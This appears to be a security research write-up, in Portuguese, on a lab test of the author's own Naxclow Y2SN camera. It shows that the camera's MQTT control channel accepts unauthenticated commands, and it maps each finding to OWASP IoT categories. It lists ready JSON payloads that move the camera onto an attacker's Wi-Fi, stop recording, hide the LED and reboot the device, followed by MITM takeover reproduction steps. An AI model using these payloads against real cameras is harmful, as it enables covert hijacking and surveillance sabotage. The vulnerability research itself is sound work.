# Achados — Canal de controle MQTT (superfície de comandos)

Câmera Naxclow Y2SN, firmware `202601081657`, `devicesCode 5c001502B330`.
Ambiente controlado — câmera própria.

O canal de controle MQTT (`Naxclow/P2P/Users/Device/sub/<devicesCode>`) aceita
**qualquer JSON publicado ali, sem autenticação**. A câmera assina esse tópico
com QoS 1 e obedece os comandos.

## Comandos confirmados

| Comando | Código | Payload | Efeito |
|---|---|---|---|
| `wifiscan` | 211 | `{"code":211}` | vaza SSIDs vizinhas (`scanWifiBase64`) |
| `record off` | 209 | `{"code":209,"sdCardReco":0}` | para gravação no SD (`sdCardReco 1→0`) |
| `ledei off` | 220 | `{"code":220,"ledEI":0}` | apaga LED de status (gravação continua) |
| `ledei on` | 220 | `{"code":220,"ledEI":1}` | acende LED de status |
| `setwifi` | 204 | `{"code":204,"s":"SSID","p":"PWD"}` | **sequestra a câmera pra outra rede** |
| `format` | 207 | `{"code":207}` | aceito, derruba a câmera (reboot) |
| `reboot` | 299 | `{"code":299,"reboot":1}` | reinicia |

## Inconclusivos / não funcionam via MQTT

| Comando | Código | Observação |
|---|---|---|
| `led` | 210 | `instLed` não controla o LED físico neste firmware (o correto é `ledEI`, 220) |
| `apmode` | 208 | reinicia mas **não entra em modo AP** real (AP é via canal relay, não MQTT) |
| PTZ / motor | 212 | via relay (canal P2P), não MQTT |
| flip / espelho | 216 | via relay |
| `speedGrade` (qualidade) | 201 | via relay |
| `movealert` | 205 | enviado, efeito não visível no `Device/Info` (provável notificação push) |

## Evidências capturadas

- `wifiscan` vazou as redes: `NET_2GB966E4` (da vítima) e `FIORETTI-5G` (vizinha).
- `setwifi Atacante` mudou `wifiName` de `NET_2GB966E4` → `Atacante` — câmera
  reconectou na rede do atacante sem toque físico.
- `record off` mudou `sdCardReco` de `1` → `0`.
- `ledei off` apagou o LED fisicamente (confirmado visualmente), sem parar gravação.

## OWASP IoT

| Achado | OWASP |
|---|---|
| Canal de controle sem credencial | I1 / I3 |
| Comando `setwifi` move a câmera pra rede do atacante | I2 / I3 |
| `wifiscan` vaza SSIDs vizinhas (privacidade) | I6 |
| `ledei off` esconde atividade sem parar gravação | I3 |
| `format`/`reboot` destrutivos sem auth | I1 / I3 |

## Reprodução

1. Sobe o lab: `sudo CAM_IP=auto ./scripts/mitm_dns/mitm_dns.sh up` + `dnat on`.
2. Power cycle na câmera, espera `New client ... as 5c001502B330`.
3. Envia comandos (numa linha só):

```bash
sudo TAKEOVER_CMDS='wifiscan;ledei off;record off' ./scripts/mitm_dns/mitm_dns.sh takeover --no-stream
```

Helper manual: `scripts/fakeserver/fake_srv_cmd.sh` (e `mqtt_send_on_connect.sh`
pra enviar assim que a câmera reconectar).
